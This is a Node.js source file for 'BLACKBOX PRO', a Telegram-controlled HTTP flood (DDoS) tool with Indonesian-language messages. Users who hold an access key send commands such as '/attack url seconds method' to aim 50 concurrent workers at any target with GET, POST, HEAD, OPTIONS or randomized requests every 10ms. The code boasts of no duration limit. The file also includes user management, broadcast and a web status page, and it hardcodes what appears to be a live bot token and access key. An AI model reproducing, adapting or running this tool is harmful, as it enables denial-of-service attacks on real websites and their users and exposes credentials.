const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const app = express();

// ==== CONFIG ====
const CONFIG = {
  token: '8202346696:AAG2I28nxL0qGatWEre6IJL_y63yXXeuJMc',
  owner: 6629230649, // GANTI ID ANDA
  key: '123RJhTtApALhaT' // KEY ACCESS
};

const bot = new TelegramBot(CONFIG.token, { polling: true });
const users = new Set([CONFIG.owner]);
const attacks = new Map();

// ==== MULTI METHOD ATTACK ====
function startMultiAttack(target, duration, chatId, attackId, method = 'MIX') {
  let requests = 0;
  let success = 0;
  let failed = 0;
  const startTime = Date.now();
  const endTime = startTime + (duration * 1000);
  
  const attackMethods = {
    // Layer 7 Attacks
    'HTTP': () => axios.get(target, { timeout: 3000 }).catch(() => {}),
    'POST': () => axios.post(target, { flood: true }, { timeout: 3000 }).catch(() => {}),
    'HEAD': () => axios.head(target, { timeout: 3000 }).catch(() => {}),
    'OPTIONS': () => axios.options(target, { timeout: 3000 }).catch(() => {}),
    
    // Random data flood
    'RANDOM': () => {
      const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
      const randomMethod = methods[Math.floor(Math.random() * methods.length)];
      return axios({
        method: randomMethod,
        url: target,
        data: { data: Math.random().toString(36) },
        timeout: 3000
      }).catch(() => {});
    }
  };
  
  // Select methods based on attack type
  let methodsToUse = [];
  if (method === 'MIX') {
    methodsToUse = ['HTTP', 'POST', 'HEAD', 'OPTIONS', 'RANDOM'];
  } else if (method === 'HTTP') {
    methodsToUse = ['HTTP', 'HEAD'];
  } else if (method === 'POST') {
    methodsToUse = ['POST', 'RANDOM'];
  } else {
    methodsToUse = [method];
  }
  
  const workers = [];
  
  // Create multiple workers
  for (let i = 0; i < 50; i++) {
    const worker = setInterval(async () => {
      if (Date.now() > endTime) {
        clearInterval(worker);
        return;
      }
      
      try {
        // Send multiple requests per worker
        const method = methodsToUse[Math.floor(Math.random() * methodsToUse.length)];
        await attackMethods[method]();
        success++;
      } catch {
        failed++;
      }
      requests++;
    }, 10); // 10ms interval = 100 requests per second per worker
    
    workers.push(worker);
  }
  
  attacks.set(attackId, {
    workers,
    chatId,
    startTime,
    target,
    method
  });
  
  // Auto stop timer
  setTimeout(() => {
    const attack = attacks.get(attackId);
    if (attack) {
      attack.workers.forEach(worker => clearInterval(worker));
      attacks.delete(attackId);
      const totalTime = (Date.now() - attack.startTime) / 1000;
      bot.sendMessage(chatId,
        `✅ ATTACK FINISHED\n` +
        `ID: ${attackId}\n` +
        `Target: ${attack.target}\n` +
        `Duration: ${totalTime.toFixed(1)}s\n` +
        `Requests: ${requests}\n` +
        `Success: ${success}\n` +
        `Failed: ${failed}`
      );
    }
  }, duration * 1000);
  
  // Progress updates every 30 seconds
  const progressInterval = setInterval(() => {
    if (Date.now() > endTime) {
      clearInterval(progressInterval);
      return;
    }
    
    const elapsed = (Date.now() - startTime) / 1000;
    const remaining = duration - elapsed;
    const rps = (requests / elapsed).toFixed(1);
    
    if (remaining > 0 && remaining % 30 === 0) {
      bot.sendMessage(chatId,
        `📊 ATTACK PROGRESS\n` +
        `ID: ${attackId}\n` +
        `Elapsed: ${elapsed.toFixed(0)}s\n` +
        `Remaining: ${remaining.toFixed(0)}s\n` +
        `RPS: ${rps}\n` +
        `Total: ${requests} requests`
      );
    }
  }, 30000);
}

// ==== BOT COMMANDS ====
bot.onText(/\/start/, (msg) => {
  const id = msg.from.id;
  const isOwner = id === CONFIG.owner;
  const isUser = users.has(id);
  
  let text = `⚡ BLACKBOX PRO\nUser ID: ${id}\n\n`;
  
  if (isOwner) {
    text += `👑 OWNER COMMANDS:\n`;
    text += `/attack url seconds method - Start attack\n`;
    text += `/stop id - Stop attack\n`;
    text += `/list - Show active attacks\n`;
    text += `/users - Show all users\n`;
    text += `/add id - Add user\n`;
    text += `/remove id - Remove user\n`;
    text += `/methods - Show attack methods\n`;
    text += `/broadcast text - Broadcast message\n`;
  } else if (isUser) {
    text += `✅ USER COMMANDS:\n`;
    text += `/attack url seconds method\n`;
    text += `/stop id\n`;
    text += `/methods\n`;
  } else {
    text += `🔒 UNAUTHORIZED\n`;
    text += `/key ${CONFIG.key} - Untuk akses\n`;
  }
  
  bot.sendMessage(msg.chat.id, text);
});

bot.onText(/\/key (.+)/, (msg, match) => {
  const id = msg.from.id;
  
  if (id === CONFIG.owner) {
    bot.sendMessage(msg.chat.id, 'Owner tidak perlu key');
    return;
  }
  
  if (match[1] === CONFIG.key) {
    users.add(id);
    bot.sendMessage(msg.chat.id, `✅ AKTIF! ID: ${id}\nSekarang bisa pakai /attack`);
  } else {
    bot.sendMessage(msg.chat.id, '❌ KEY SALAH');
  }
});

bot.onText(/\/attack (.+?) (\d+)(?: (.+))?/, (msg, match) => {
  const id = msg.from.id;
  
  if (!users.has(id) && id !== CONFIG.owner) {
    bot.sendMessage(msg.chat.id, '❌ Belum register\n/key BLACKBOXVIP');
    return;
  }
  
  const url = match[1].trim();
  const seconds = parseInt(match[2]);
  const method = (match[3] || 'MIX').toUpperCase();
  
  const validMethods = ['HTTP', 'POST', 'HEAD', 'OPTIONS', 'RANDOM', 'MIX'];
  if (!validMethods.includes(method)) {
    bot.sendMessage(msg.chat.id, `❌ Method invalid\nGunakan: ${validMethods.join(', ')}`);
    return;
  }
  
  // NO DURATION LIMIT
  if (seconds < 1) {
    bot.sendMessage(msg.chat.id, '❌ Minimal 1 detik');
    return;
  }
  
  const attackId = Math.random().toString(36).substring(2, 8).toUpperCase();
  
  bot.sendMessage(msg.chat.id,
    `🚀 ATTACK LAUNCHED\n\n` +
    `ID: ${attackId}\n` +
    `Target: ${url}\n` +
    `Method: ${method}\n` +
    `Duration: ${seconds} seconds\n\n` +
    `Stop: /stop ${attackId}`
  );
  
  startMultiAttack(url, seconds, msg.chat.id, attackId, method);
});

bot.onText(/\/stop (.+)/, (msg, match) => {
  const attackId = match[1].toUpperCase();
  const attack = attacks.get(attackId);
  
  if (!attack) {
    bot.sendMessage(msg.chat.id, '❌ Attack ID tidak ditemukan');
    return;
  }
  
  const userId = msg.from.id;
  if (attack.chatId !== msg.chat.id && userId !== CONFIG.owner) {
    bot.sendMessage(msg.chat.id, '❌ Hanya owner atau pembuat attack yang bisa stop');
    return;
  }
  
  attack.workers.forEach(worker => clearInterval(worker));
  attacks.delete(attackId);
  
  const duration = (Date.now() - attack.startTime) / 1000;
  bot.sendMessage(msg.chat.id,
    `🛑 ATTACK STOPPED\n` +
    `ID: ${attackId}\n` +
    `Duration: ${duration.toFixed(1)}s\n` +
    `Target: ${attack.target}`
  );
});

bot.onText(/\/list/, (msg) => {
  if (msg.from.id !== CONFIG.owner) return;
  
  if (attacks.size === 0) {
    bot.sendMessage(msg.chat.id, '📭 No active attacks');
    return;
  }
  
  let text = `📋 ACTIVE ATTACKS (${attacks.size})\n\n`;
  
  attacks.forEach((attack, id) => {
    const duration = ((Date.now() - attack.startTime) / 1000).toFixed(0);
    text += `ID: ${id}\n`;
    text += `Target: ${attack.target}\n`;
    text += `Method: ${attack.method}\n`;
    text += `Duration: ${duration}s\n`;
    text += `User: ${attack.chatId}\n`;
    text += `Stop: /stop ${id}\n\n`;
  });
  
  bot.sendMessage(msg.chat.id, text);
});

bot.onText(/\/methods/, (msg) => {
  const methods = [
    'HTTP - GET/HEAD requests',
    'POST - POST data flood',
    'OPTIONS - OPTIONS method flood',
    'RANDOM - Random methods & data',
    'MIX - All methods mixed (default)'
  ];
  
  bot.sendMessage(msg.chat.id,
    `⚡ ATTACK METHODS:\n\n${methods.join('\n')}\n\n` +
    `Contoh: /attack https://target.com 60 MIX\n` +
    `        /attack https://target.com 120 POST\n` +
    `        /attack https://target.com 300 RANDOM`
  );
});

bot.onText(/\/add (\d+)/, (msg) => {
  if (msg.from.id !== CONFIG.owner) return;
  
  const newId = parseInt(msg.text.split(' ')[1]);
  users.add(newId);
  bot.sendMessage(msg.chat.id, `✅ User ${newId} added`);
  bot.sendMessage(newId, `🎉 Anda ditambahkan oleh owner\nGunakan /start untuk melihat commands`);
});

bot.onText(/\/remove (\d+)/, (msg) => {
  if (msg.from.id !== CONFIG.owner) return;
  
  const removeId = parseInt(msg.text.split(' ')[1]);
  users.delete(removeId);
  bot.sendMessage(msg.chat.id, `❌ User ${removeId} removed`);
});

bot.onText(/\/users/, (msg) => {
  if (msg.from.id !== CONFIG.owner) return;
  
  const userList = Array.from(users).map(id => `👤 ${id}`).join('\n');
  bot.sendMessage(msg.chat.id, `📊 TOTAL USERS: ${users.size}\n\n${userList}`);
});

bot.onText(/\/broadcast (.+)/, (msg, match) => {
  if (msg.from.id !== CONFIG.owner) return;
  
  const broadcastText = match[1];
  let sent = 0;
  let failed = 0;
  
  users.forEach(userId => {
    bot.sendMessage(userId, `📢 BROADCAST FROM OWNER:\n\n${broadcastText}`)
      .then(() => sent++)
      .catch(() => failed++);
  });
  
  setTimeout(() => {
    bot.sendMessage(msg.chat.id, `📤 Broadcast sent:\nSuccess: ${sent}\nFailed: ${failed}`);
  }, 5000);
});

// ==== WEB INTERFACE ====
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>BLACKBOX PRO</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          background: #0a0a0a;
          color: #00ff00;
          font-family: 'Courier New', monospace;
          padding: 20px;
          line-height: 1.6;
        }
        .container {
          max-width: 800px;
          margin: 0 auto;
          border: 1px solid #00ff00;
          padding: 20px;
          border-radius: 5px;
          background: rgba(0, 255, 0, 0.05);
        }
        h1 {
          color: #00ff00;
          border-bottom: 2px solid #00ff00;
          padding-bottom: 10px;
          margin-bottom: 20px;
        }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin: 20px 0;
        }
        .stat-box {
          background: rgba(0, 255, 0, 0.1);
          padding: 15px;
          border-radius: 5px;
          border: 1px solid #00ff00;
        }
        .stat-title {
          color: #00ff00;
          font-size: 14px;
          opacity: 0.8;
        }
        .stat-value {
          color: #00ff00;
          font-size: 24px;
          font-weight: bold;
          margin-top: 5px;
        }
        .status-active {
          color: #00ff00;
          animation: blink 1s infinite;
        }
        @keyframes blink {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
        footer {
          margin-top: 30px;
          text-align: center;
          color: #008000;
          font-size: 12px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>⚡ BLACKBOX PRO</h1>
        
        <div class="stats">
          <div class="stat-box">
            <div class="stat-title">SYSTEM STATUS</div>
            <div class="stat-value status-active">ACTIVE</div>
          </div>
          <div class="stat-box">
            <div class="stat-title">TOTAL USERS</div>
            <div class="stat-value">${users.size}</div>
          </div>
          <div class="stat-box">
            <div class="stat-title">ACTIVE ATTACKS</div>
            <div class="stat-value">${attacks.size}</div>
          </div>
          <div class="stat-box">
            <div class="stat-title">OWNER ID</div>
            <div class="stat-value">${CONFIG.owner}</div>
          </div>
        </div>
        
        <div style="margin-top: 30px; padding: 15px; background: rgba(0, 255, 0, 0.05); border-radius: 5px;">
          <div style="color: #00ff00; margin-bottom: 10px; font-weight: bold;">📌 BOT COMMANDS:</div>
          <div style="color: #90ee90; font-size: 14px; line-height: 1.8;">
            <div>/start - Show menu</div>
            <div>/key [key] - Register user</div>
            <div>/attack [url] [seconds] [method] - Start attack</div>
            <div>/methods - Show attack methods</div>
            <div>/stop [id] - Stop attack</div>
          </div>
        </div>
        
        <footer>
          BLACKBOX PRO © ${new Date().getFullYear()} | System Uptime: ${Math.floor(process.uptime() / 60)} minutes
        </footer>
      </div>
    </body>
    </html>
  `);
});

app.get('/stats', (req, res) => {
  res.json({
    status: 'active',
    owner: CONFIG.owner,
    total_users: users.size,
    active_attacks: attacks.size,
    attacks: Array.from(attacks.keys())
  });
});

// ==== START SERVER ====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`
  ╔══════════════════════════════════════╗
  ║         BLACKBOX PRO ACTIVE          ║
  ╠══════════════════════════════════════╣
  ║  Port: ${PORT}                        ║
  ║  Owner: ${CONFIG.owner}               ║
  ║  Access Key: ${CONFIG.key}            ║
  ╚══════════════════════════════════════╝
  `);
});

// Keep alive
setInterval(() => {
  console.log(`[${new Date().toLocaleTimeString()}] Active attacks: ${attacks.size}`);
}, 60000);
